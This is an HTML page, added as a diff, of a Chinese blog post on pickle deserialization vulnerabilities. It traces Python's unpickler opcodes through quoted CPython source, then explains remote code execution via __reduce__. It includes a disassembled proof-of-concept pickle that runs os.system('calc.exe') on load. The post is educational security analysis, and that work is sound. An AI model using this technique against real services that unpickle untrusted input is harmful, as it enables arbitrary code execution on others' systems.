@@ -1,0 +1,170 @@
+<!doctype html><html lang=zh><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>pickle反序列化漏洞浅析</title><meta content=pickle反序列化漏洞浅析 name=title><meta content=一点点从这个世界上消失。 name=description><meta content=website property=og:type><meta content=https://nnnewb.github.io/posts/2022/2022-06-24-picklefan-xu-lie-hua-lou-dong/ property=og:url><meta content="weakptr's blog" property=og:site_name><meta content=pickle反序列化漏洞浅析 property=og:title><meta content=一点点从这个世界上消失。 property=og:description><meta content=https://nnnewb.github.io/image/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://nnnewb.github.io/posts/2022/2022-06-24-picklefan-xu-lie-hua-lou-dong/ property=twitter:url><meta content=pickle反序列化漏洞浅析 property=twitter:title><meta content=一点点从这个世界上消失。 property=twitter:description><meta content=https://nnnewb.github.io/image/favicon.ico property=twitter:image><link href=https://nnnewb.github.io/posts/2022/2022-06-24-picklefan-xu-lie-hua-lou-dong/ rel=canonical><link rel="shortcut icon" href=https://nnnewb.github.io/image/favicon.ico type=image/x-icon><link href=https://nnnewb.github.io/css/reset.css rel=stylesheet><link href=https://nnnewb.github.io/css/pallete.css rel=stylesheet><link href=https://nnnewb.github.io/css/suCSS.css rel=stylesheet><link href=https://nnnewb.github.io/archive.css rel=stylesheet><link href=https://nnnewb.github.io/style.css rel=stylesheet><script defer src=https://nnnewb.github.io/js/script.js></script><link crossorigin href=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y rel=stylesheet><script crossorigin defer integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js></script><script crossorigin defer integrity=sha384-zWYbd0NBwgTsgIdFKVprSfTh1mbMPe5Hz1X3yY4Sd1h/K1cQoUe36OGwAGz/PcDy src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/mathtex-script-type.min.js></script><script crossorigin defer integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js></script><script>document.addEventListener("DOMContentLoaded", function () {
+        renderMathInElement(document.body, {
+            // customised options
+            // • auto-render specific keys, e.g.:
+            delimiters: [
+                { left: '$$', right: '$$', display: true },
+                { left: '$', right: '$', display: false },
+                { left: '\\(', right: '\\)', display: false },
+                { left: '\\[', right: '\\]', display: false }
+            ],
+            // • rendering keys, e.g.:
+            throwOnError: true
+        });
+    });</script><script src=https://cdn.jsdelivr.net/npm/mermaid@11.6.0/dist/mermaid.min.js></script><script>document.addEventListener('DOMContentLoaded', function () {
+        // 查找所有具有 'pre' 标签且类名为 'language-mermaid' 的元素
+        const mermaidElements = document.getElementsByClassName('language-mermaid');
+        for (let i = 0; i < mermaidElements.length; i++) {
+            const el = mermaidElements.item(i);
+            if (el.tagName === "PRE" && !el.classList.contains('mermaid')) {
+                el.innerHTML = el.textContent;
+                el.classList.add('mermaid');
+            }
+        }
+
+        mermaid.initialize({ startOnLoad: true, theme: 'dark', });
+    })</script><script>if (window.location.hostname.toLowerCase() !== 'localhost' && window.location.hostname !== '127.0.0.1') {
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?dbb9df33a2de52aede8bccd84a7493ad";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    }</script><link href=https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkaibright/dist/LXGWBright-Medium/result.css rel=stylesheet><link href=https://chinese-fonts-cdn.deno.dev/packages/maple-mono-cn/dist/MapleMono-CN-Regular/result.css rel=stylesheet><body><header><nav id=nav-bar><a href=/> 首页 </a>  /  <a href=/posts/> 文章 </a>  /  <a href=/categories/> 分类 </a>  /  <a href=/tags/> 标签 </a>  /  <a href=/search/> 搜索 </a>  /  <div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://nnnewb.github.io/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://nnnewb.github.io/click.ogg type=audio/ogg></audio></div></nav></header><main><h1>pickle反序列化漏洞浅析</h1><p class=author-line>作于：2022-06-24 18:11 ，预计阅读时间 7 分钟<article><h2 id=qian-yan>前言</h2><p>挑了个好捏的软柿子下手，来看下反序列化漏洞一般什么原理。<h2 id=yuan-li>原理</h2><h3 id=gai-shu>概述</h3><p>Python 是个动态类型且高度灵活的语言，这意味着直接按内存布局序列化基本是没戏的。想序列化一个Python中的实例，很大程度要依靠Python的高度灵活性。<p>pickle 是一种 Python 的序列化库（或者，序列化协议？），其优势是几乎能序列化任何 Python 对象，但为了实现这种优势，pickle 会根据输入而执行指定的函数，从而造成RCE。<p>可以用 <code>fickling</code> 和 <code>pickletools</code> 这两个工具分析 pickle 序列化后的字节序列。<p><img alt=序列化简单列表 src=https://nnnewb.github.io/posts/2022/2022-06-24-picklefan-xu-lie-hua-lou-dong/image-20220624162554139.webp><h3 id=fan-xu-lie-hua>反序列化</h3><p>接着分析下序列化后的这些数据是怎么还原成 Python 对象的。以 <code>pickle.dumps([1,2,3])</code> 的结果为例，以 <code>pickletools.dis</code> 还原成字节码，Python 3.7.9 pickle 模块源码 <a href=https://github.com/python/cpython/blob/13c94747c74437e594b7fc242ff7da668e81887c/Lib/pickle.py>pickle.py</a><pre style=color:#fdf4c1aa;background-color:#282828><code><span>    0: \x80 PROTO      3
+</span><span>    2: ]    EMPTY_LIST
+</span><span>    3: q    BINPUT     0
+</span><span>    5: (    MARK
+</span><span>    6: K        BININT1    1
+</span><span>    8: K        BININT1    2
+</span><span>   10: K        BININT1    3
+</span><span>   12: e        APPENDS    (MARK at 5)
+</span><span>   13: .    STOP
+</span></code></pre><p>pickle 反序列化是一个类似基于栈的虚拟机，上面恢复的字节码等于这个虚拟机的汇编指令。上面第一列是偏移值，单位字节。第二、三列理解成指令，第四列自然是操作数。<p>然后我们看 <code>pickle.py</code> 中如何把上面这些”指令“恢复成 Python 对象。<h4 id=vmmo-xing>vm模型</h4><p>先看 <code>pickle.py</code> 中的 <code>_Unpickler</code> 类，跳转到<code>load</code>方法。<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span>    </span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>load</span><span>(</span><span style=color:#fdf4c1>self</span><span>):
+</span><span>        </span><span style=color:#928374;font-style:italic>"""Read a pickled object representation from the open file.
+</span><span style=color:#928374;font-style:italic>
+</span><span style=color:#928374;font-style:italic>        Return the reconstituted object hierarchy specified in the file.
+</span><span style=color:#928374;font-style:italic>        """
+</span><span>        </span><span style=color:#928374;font-style:italic># Check whether Unpickler was initialized correctly. This is
+</span><span>        </span><span style=color:#928374;font-style:italic># only needed to mimic the behavior of _pickle.Unpickler.dump().
+</span><span>        </span><span style=color:#fa5c4b>if </span><span style=color:#fe8019>not </span><span style=color:#fabd2f>hasattr</span><span style=color:#fdf4c1>(self, </span><span style=color:#b8bb26>"_file_read"</span><span style=color:#fdf4c1>)</span><span>:
+</span><span>            </span><span style=color:#fa5c4b>raise </span><span style=color:#fdf4c1>UnpicklingError(</span><span style=color:#b8bb26>"Unpickler.__init__() was not called by "
+</span><span style=color:#fdf4c1>                                  </span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>%s</span><span style=color:#b8bb26>.__init__()" </span><span style=color:#fe8019>% </span><span style=color:#fdf4c1>(self.</span><span style=color:#fabd2f>__class__</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>__name__</span><span style=color:#fdf4c1>,))
+</span><span>        </span><span style=color:#fdf4c1>self</span><span>._unframer </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>_Unframer(self._file_read, self._file_readline)
+</span><span>        </span><span style=color:#fdf4c1>self</span><span>.read </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>self</span><span>._unframer.read
+</span><span>        </span><span style=color:#fdf4c1>self</span><span>.readline </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>self</span><span>._unframer.readline
+</span><span>        </span><span style=color:#fdf4c1>self</span><span>.metastack </span><span style=color:#fe8019>= </span><span>[]
+</span><span>        </span><span style=color:#fdf4c1>self</span><span>.stack </span><span style=color:#fe8019>= </span><span>[]
+</span><span>        </span><span style=color:#fdf4c1>self</span><span>.append </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>self</span><span>.stack.append
+</span><span>        </span><span style=color:#fdf4c1>self</span><span>.proto </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0
+</span><span>        read </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>self</span><span>.read
+</span><span>        dispatch </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>self</span><span>.dispatch
+</span><span>        </span><span style=color:#fa5c4b>try</span><span>:
+</span><span>            </span><span style=color:#fa5c4b>while </span><span style=color:#d3869b>True</span><span>:
+</span><span>                key </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>read(</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)
+</span><span>                </span><span style=color:#fa5c4b>if </span><span style=color:#fe8019>not </span><span>key:
+</span><span>                    </span><span style=color:#fa5c4b>raise </span><span style=color:#fabd2f>EOFError
+</span><span>                </span><span style=color:#fa5c4b>assert </span><span style=color:#fabd2f>isinstance</span><span style=color:#fdf4c1>(key, bytes_types)
+</span><span>                dispatch[key[</span><span style=color:#d3869b>0</span><span>]]</span><span style=color:#fdf4c1>(self)
+</span><span>        </span><span style=color:#fa5c4b>except </span><span>_Stop </span><span style=color:#fa5c4b>as </span><span>stopinst:
+</span><span>            </span><span style=color:#fa5c4b>return </span><span>stopinst.value
+</span></code></pre><p>这里已经出现了核心逻辑和最重要的几个属性：<code>stack</code>、<code>metastack</code>、<code>dispatch</code>。<p><code>stack</code>顾名思义即可，<code>dispatch</code>则是一个 opcode 到 <code>_Unpickler</code> 方法的映射字典。opcode 定义在这个文件的 98~179 行。<p>在重要数据结构初始化后，接下来是主循环，从输入中读<code>key</code>（指令），派发执行。<h4 id=proto>PROTO</h4><p>回顾上一节的字节码，我们从 <code>PROTO 3</code> 开始看 pickle 如何处理这些指令。<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span>    </span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>load_proto</span><span>(</span><span style=color:#fdf4c1>self</span><span>):
+</span><span>        proto </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>self.read(</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)</span><span>[</span><span style=color:#d3869b>0</span><span>]
+</span><span>        </span><span style=color:#fa5c4b>if </span><span style=color:#fe8019>not </span><span style=color:#d3869b>0 </span><span style=color:#fe8019>&lt;= </span><span>proto </span><span style=color:#fe8019>&lt;= </span><span style=color:#fdf4c1>HIGHEST_PROTOCOL</span><span>:
+</span><span>            </span><span style=color:#fa5c4b>raise </span><span style=color:#fabd2f>ValueError</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"unsupported pickle protocol: </span><span style=color:#fdf4c1>%d</span><span style=color:#b8bb26>" </span><span style=color:#fe8019>% </span><span style=color:#fdf4c1>proto)
+</span><span>        </span><span style=color:#fdf4c1>self</span><span>.proto </span><span style=color:#fe8019>= </span><span>proto
+</span><span>    dispatch[</span><span style=color:#fdf4c1>PROTO</span><span>[</span><span style=color:#d3869b>0</span><span>]] </span><span style=color:#fe8019>= </span><span>load_proto
+</span></code></pre><p><code>PROTO 3</code> 指令读了操作数 <code>3</code> 并赋值。注意看<pre style=color:#fdf4c1aa;background-color:#282828><code><span>    0: \x80 PROTO      3
+</span><span>    2: ]    EMPTY_LIST
+</span></code></pre><p><code>PROTO 3</code> 正好 2 字节，在<code>load</code>中读取的第一个字节表示<code>proto</code>指令，操作数<code>3</code>是第二个字节。<h4 id=empty-list>EMPTY_LIST</h4><p><code>    EMPTY_LIST</code> 我们继续看这个指令。<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span>    </span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>load_empty_list</span><span>(</span><span style=color:#fdf4c1>self</span><span>):
+</span><span>        </span><span style=color:#fdf4c1>self.append([])
+</span><span>    dispatch[</span><span style=color:#fdf4c1>EMPTY_LIST</span><span>[</span><span style=color:#d3869b>0</span><span>]] </span><span style=color:#fe8019>= </span><span>load_empty_list
+</span></code></pre><p><code>self.append</code> 是 <code>self.stack.append</code> 的别名，我们在 <code>load</code> 函数定义里已经知道了这一点。这一步往栈中压了一个空的列表<code>list</code>。<h4 id=binput>BINPUT</h4><p><code>BINPUT 0</code><pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span>    </span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>load_binput</span><span>(</span><span style=color:#fdf4c1>self</span><span>):
+</span><span>        i </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>self.read(</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)</span><span>[</span><span style=color:#d3869b>0</span><span>]
+</span><span>        </span><span style=color:#fa5c4b>if </span><span>i </span><span style=color:#fe8019>&lt; </span><span style=color:#d3869b>0</span><span>:
+</span><span>            </span><span style=color:#fa5c4b>raise </span><span style=color:#fabd2f>ValueError</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"negative BINPUT argument"</span><span style=color:#fdf4c1>)
+</span><span>        </span><span style=color:#fdf4c1>self</span><span>.memo[i] </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>self</span><span>.stack[</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>]
+</span><span>    dispatch[</span><span style=color:#fdf4c1>BINPUT</span><span>[</span><span style=color:#d3869b>0</span><span>]] </span><span style=color:#fe8019>= </span><span>load_binput
+</span></code></pre><p>在<code>PUT</code>系列指令的定义处有注释：<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fdf4c1>PUT            </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'p'   </span><span style=color:#928374;font-style:italic># store stack top in memo; index is string arg
+</span><span style=color:#fdf4c1>BINPUT         </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'q'   </span><span style=color:#928374;font-style:italic>#   "     "    "   "   " ;   "    " 1-byte arg
+</span><span style=color:#fdf4c1>LONG_BINPUT    </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'r'   </span><span style=color:#928374;font-style:italic>#   "     "    "   "   " ;   "    " 4-byte arg
+</span></code></pre><p><code>BINPUT</code> 指令的含义是将栈顶变量（空列表）放到 <code>memo</code> 中（理解为寄存器？）。这个指令的操作数就相当于是寄存器名了。<h4 id=mark>MARK</h4><pre style=color:#fdf4c1aa;background-color:#282828><code><span>    0: \x80 PROTO      3
+</span><span>    2: ]    EMPTY_LIST
+</span><span>    3: q    BINPUT     0
+</span><span>    5: (    MARK
+</span></code></pre><pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fdf4c1>MARK           </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'('   </span><span style=color:#928374;font-style:italic># push special markobject on stack
+</span><span>
+</span><span style=color:#928374;font-style:italic># ...
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>load_mark</span><span>(</span><span style=color:#fdf4c1>self</span><span>):
+</span><span>    </span><span style=color:#fdf4c1>self.metastack.append(self.stack)
+</span><span>    </span><span style=color:#fdf4c1>self</span><span>.stack </span><span style=color:#fe8019>= </span><span>[]
+</span><span>    </span><span style=color:#fdf4c1>self</span><span>.append </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>self</span><span>.stack.append
+</span><span>dispatch[</span><span style=color:#fdf4c1>MARK</span><span>[</span><span style=color:#d3869b>0</span><span>]] </span><span style=color:#fe8019>= </span><span>load_mark
+</span></code></pre><p><code>MARK</code> 指令将栈压到了 <code>metastack</code> 中，替换了当前栈。应该是一个类似栈帧的机制。<h4 id=binint>BININT</h4><pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fdf4c1>BININT         </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'J'   </span><span style=color:#928374;font-style:italic># push four-byte signed int
+</span><span style=color:#fdf4c1>BININT1        </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'K'   </span><span style=color:#928374;font-style:italic># push 1-byte unsigned int
+</span><span style=color:#fdf4c1>LONG           </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'L'   </span><span style=color:#928374;font-style:italic># push long; decimal string argument
+</span><span style=color:#fdf4c1>BININT2        </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'M'   </span><span style=color:#928374;font-style:italic># push 2-byte unsigned int
+</span></code></pre><p><code>BININT</code> 系列的指令都是压栈一个操作数。在<code>MARK</code>指令后，是连续的三条<code>BININT1</code>指令。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>    5: (    MARK
+</span><span>    6: K        BININT1    1
+</span><span>    8: K        BININT1    2
+</span><span>   10: K        BININT1    3
+</span></code></pre><h4 id=appends>APPENDS</h4><pre style=color:#fdf4c1aa;background-color:#282828><code><span>   10: K        BININT1    3
+</span><span>   12: e        APPENDS    (MARK at 5)
+</span></code></pre><pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span>    </span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>load_appends</span><span>(</span><span style=color:#fdf4c1>self</span><span>):
+</span><span>        items </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>self.pop_mark()
+</span><span>        list_obj </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>self</span><span>.stack[</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>]
+</span><span>        </span><span style=color:#fa5c4b>try</span><span>:
+</span><span>            extend </span><span style=color:#fe8019>= </span><span>list_obj.extend
+</span><span>        </span><span style=color:#fa5c4b>except </span><span style=color:#fabd2f>AttributeError</span><span>:
+</span><span>            </span><span style=color:#fa5c4b>pass
+</span><span>        </span><span style=color:#fa5c4b>else</span><span>:
+</span><span>            </span><span style=color:#fdf4c1>extend(items)
+</span><span>            </span><span style=color:#fa5c4b>return
+</span><span>        </span><span style=color:#928374;font-style:italic># Even if the PEP 307 requires extend() and append() methods,
+</span><span>        </span><span style=color:#928374;font-style:italic># fall back on append() if the object has no extend() method
+</span><span>        </span><span style=color:#928374;font-style:italic># for backward compatibility.
+</span><span>        append </span><span style=color:#fe8019>= </span><span>list_obj.append
+</span><span>        </span><span style=color:#fa5c4b>for </span><span>item </span><span style=color:#fa5c4b>in </span><span>items:
+</span><span>            </span><span style=color:#fdf4c1>append(item)
+</span><span>    dispatch[</span><span style=color:#fdf4c1>APPENDS</span><span>[</span><span style=color:#d3869b>0</span><span>]] </span><span style=color:#fe8019>= </span><span>load_appends
+</span></code></pre><p><code>appends</code>将<code>memo</code>中保存的前一个栈弹出，然后把当前栈上的所有值压到前一个栈顶的空列表中。如此就成功得到了我们输入的列表。<h4 id=stop>STOP</h4><p>最后的 <code>STOP</code> 指令没有操作数。<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span>    </span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>load_stop</span><span>(</span><span style=color:#fdf4c1>self</span><span>):
+</span><span>        value </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>self.stack.pop()
+</span><span>        </span><span style=color:#fa5c4b>raise </span><span style=color:#fdf4c1>_Stop(value)
+</span><span>    dispatch[</span><span style=color:#fdf4c1>STOP</span><span>[</span><span style=color:#d3869b>0</span><span>]] </span><span style=color:#fe8019>= </span><span>load_stop
+</span></code></pre><p>效果也很简单，将栈顶的对象弹出，这个对象就是最终被 pickle 恢复完成的对象了。<h3 id=rceli-yong>RCE利用</h3><p>pickle 的反序列化任意代码执行漏洞来自 pickle 序列化/反序列化实例的一种约定，即<code>__reduce__</code>魔术方法。<p>对自定义类的实例，pickle 没法保证一定能还原出原对象。比如类里包含一个打开了的文件描述符，fd是没法保存的，程序一重启先前保存的 fd 就失效了，如果要恢复唯一的办法就是重新打开一次，或重新构造一次这个实例。<p>提供 <code>__reduce__</code> 魔术方法以允许 pickle 将当前对象转为一系列构造和恢复实例所需的参数：类型、构造参数、状态参数等。<p>一般对 <code>__reduce__</code> 的利用就是构造参数的部分，将构造方法指定为 <code>os.system</code> 即可执行任意命令。<p>同样这里提供一个例子，在反序列化时会弹出计算器。<p><img alt=image-20220624175833655 src=https://nnnewb.github.io/posts/2022/2022-06-24-picklefan-xu-lie-hua-lou-dong/image-20220624175833655.webp><pre style=color:#fdf4c1aa;background-color:#282828><code><span>    0: \x80 PROTO      3
+</span><span>    2: c    GLOBAL     'nt system'
+</span><span>   13: q    BINPUT     0
+</span><span>   15: X    BINUNICODE 'calc.exe'
+</span><span>   28: q    BINPUT     1
+</span><span>   30: \x85 TUPLE1
+</span><span>   31: q    BINPUT     2
+</span><span>   33: R    REDUCE
+</span><span>   34: q    BINPUT     3
+</span><span>   36: .    STOP
+</span><span>highest protocol among opcodes = 2
+</span><span>None
+</span></code></pre><p>接着我们具体分析我们没见过的指令。<h4 id=global>GLOBAL</h4><pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span>    </span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>load_global</span><span>(</span><span style=color:#fdf4c1>self</span><span>):
+</span><span>        module </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>self.readline()</span><span>[:</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>]</span><span style=color:#fdf4c1>.decode(</span><span style=color:#b8bb26>"utf-8"</span><span style=color:#fdf4c1>)
+</span><span>        name </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>self.readline()</span><span>[:</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>]</span><span style=color:#fdf4c1>.decode(</span><span style=color:#b8bb26>"utf-8"</span><span style=color:#fdf4c1>)
+</span><span>        klass </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>self.find_class(module, name)
+</span><span>        </span><span style=color:#fdf4c1>self.append(klass)
+</span><span>    dispatch[</span><span style=color:#fdf4c1>GLOBAL</span><span>[</span><span style=color:#d3869b>0</span><span>]] </span><span style=color:#fe8019>= </span><span>load_global
+</span></code></pre><p>global 指令查找指定的模块，注意<code>find_class</code>并不<strong>只</strong>找类，函数也能被找出来。这一条指令执行后，栈顶保存的就是 <code>nt.system</code> 了。<h4 id=binunicode>BINUNICODE</h4><pre style=color:#fdf4c1aa;background-color:#282828><code><span>   13: q    BINPUT     0
+</span><span>   15: X    BINUNICODE 'calc.exe'
+</span></code></pre><p>在<code>BINPUT</code>把<code>nt.system</code>所在的栈记到 <code>memo[0]</code> 后，是一个 <code>BINUNICODE</code>。<p>和<code>BININT</code>差不多，压栈一个unicode字符串。<h4 id=tuple1>TUPLE1</h4><pre style=color:#fdf4c1aa;background-color:#282828><code><span>   28: q    BINPUT     1
+</span><span>   30: \x85 TUPLE1
+</span></code></pre><p>再次更换栈，<code>TUPLE1</code>从栈顶构造一个元组。<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span>    </span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>load_tuple1</span><span>(</span><span style=color:#fdf4c1>self</span><span>):
+</span><span>        </span><span style=color:#fdf4c1>self</span><span>.stack[</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>] </span><span style=color:#fe8019>= </span><span>(</span><span style=color:#fdf4c1>self</span><span>.stack[</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>],)
+</span><span>    dispatch[</span><span style=color:#fdf4c1>TUPLE1</span><span>[</span><span style=color:#d3869b>0</span><span>]] </span><span style=color:#fe8019>= </span><span>load_tuple1
+</span></code></pre><p>这一步将刚压栈的<code>calc.exe</code>构造成了<code>('calc.exe',)</code>。<h4 id=reduce>REDUCE</h4><pre style=color:#fdf4c1aa;background-color:#282828><code><span>   31: q    BINPUT     2
+</span><span>   33: R    REDUCE
+</span></code></pre><p>将刚构造好的元组记录到<code>memo[2]</code>后，开始 <code>REDUCE</code> 指令。正是这一步触发了任意代码执行。<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fdf4c1>REDUCE         </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'R'   </span><span style=color:#928374;font-style:italic># apply callable to argtuple, both on stack
+</span><span>
+</span><span>    </span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>load_reduce</span><span>(</span><span style=color:#fdf4c1>self</span><span>):
+</span><span>        stack </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>self</span><span>.stack
+</span><span>        args </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>stack.pop()
+</span><span>        func </span><span style=color:#fe8019>= </span><span>stack[</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>]
+</span><span>        stack[</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>] </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>func(</span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>args)
+</span><span>    dispatch[</span><span style=color:#fdf4c1>REDUCE</span><span>[</span><span style=color:#d3869b>0</span><span>]] </span><span style=color:#fe8019>= </span><span>load_reduce
+</span></code></pre><p>这段代码中<code>args</code>是我们刚构造好的<code>('calc.exe',)</code>，<code>func</code>是<code>nt.system</code>，这个函数的调用结果成为最后留在栈里的对象。<p>而我们的恶意代码（弹计算器）也执行了。<h2 id=zong-jie>总结</h2></article><p class=tags-data><a href=/tags/fan-xu-lie-hua-lou-dong>/反序列化漏洞/</a> <a href=/tags/pickle>/pickle/</a> <a href=/tags/python>/python/</a></p><script data-repo-id="MDEwOlJlcG9zaXRvcnkzOTg0ODYyMTg=" async crossorigin data-category=Announcements data-category-id=DIC_kwDOF8Bqys4Cegmn data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-mapping=pathname data-reactions-enabled=1 data-repo=nnnewb/nnnewb.github.io data-strict=0 data-theme=noborder_light id=giscus_script src=https://giscus.app/client.js></script></main><footer><hr><div id=footer-container><div><p style=text-align:center>Copyright © 2018-2024 weakptr <a href=mailto:weak_ptr@outlook.com>&lt;weak_ptr@outlook.com></a><p style=text-align:center>Built with <a rel="noopener noreferrer" href=https://www.getzola.org target=_blank>Zola</a> using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> theme, <a rel="noopener noreferrer" href=https://speyll.github.io/suCSS/ target=_blank>suCSS</a> framework & <a rel="noopener noreferrer" href=https://github.com/Speyll/veqev target=_blank>veqev</a>, modified by <a rel="noopener noreferrer" href=https://github.com/nnnewb/ target=_blank>nnnewb</a>.<p style=text-align:center>Theme and color theme licensed under <a rel="noopener noreferrer" href=https://en.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a>.</div></div></footer>
